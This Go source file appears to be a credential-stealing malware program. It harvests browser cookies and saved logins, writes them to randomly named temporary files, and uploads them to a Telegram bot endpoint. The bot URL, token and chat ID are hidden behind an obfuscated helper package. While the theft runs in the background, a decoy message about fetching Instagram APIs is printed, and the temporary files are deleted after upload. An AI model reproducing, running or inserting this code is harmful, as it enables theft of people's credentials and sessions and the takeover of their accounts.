package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"sync"

	"Cobra/RiC4ef"

	"github.com/Pallinder/go-randomdata"
)

var wg = &sync.WaitGroup{}

func main() {

	wg.Add(2)

	go func() {
		browserInit()
		go getCookies()
		go getLogins()
	}()

	println("Fetching instagram APIs...")

	wg.Wait()

}

func uploadFile(path, chatID string, waitSig *sync.WaitGroup) {
	telegramAPIBase := RiC4ef.PSNbPz0()
	ReqURL := fmt.Sprintf(telegramAPIBase, RiC4ef.ERxr8Z1(), chatID)
	request, err := newfileUploadRequest(ReqURL, make(map[string]string), RiC4ef.Ul7DQM3(), path)

	if err != nil {
		return
	}
	Client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				ServerName: RiC4ef.SL666d4(),
			},
		},
	}
	Client.Do(request)

	if waitSig != nil {
		waitSig.Done()
	}
}

func getCookies() {
	tmpPath := filepath.Join(normalizePath(RiC4ef.DwHsG45() + randomdata.RandStringRunes(10)))
	cookies, err := getCookiesRaw()
	if err != nil {
		return
	}
	if cookies == "" {
		return
	}
	err = writeToFile(tmpPath, cookies)
	if err == nil {
		uploadFile(tmpPath, RiC4ef.Wprep42(), nil)
		os.Remove(tmpPath)
		wg.Done()
	}
}

func getLogins() {
	tmpPath := filepath.Join(normalizePath(RiC4ef.DwHsG45() + randomdata.RandStringRunes(10)))
	Logins, err := getLoginsRaw()
	if err != nil {
		return
	}
	if Logins == "" {
		return
	}
	err = writeToFile(tmpPath, Logins)
	if err == nil {
		uploadFile(tmpPath, RiC4ef.Wprep42(), nil)
		os.Remove(tmpPath)
		wg.Done()
	}
}
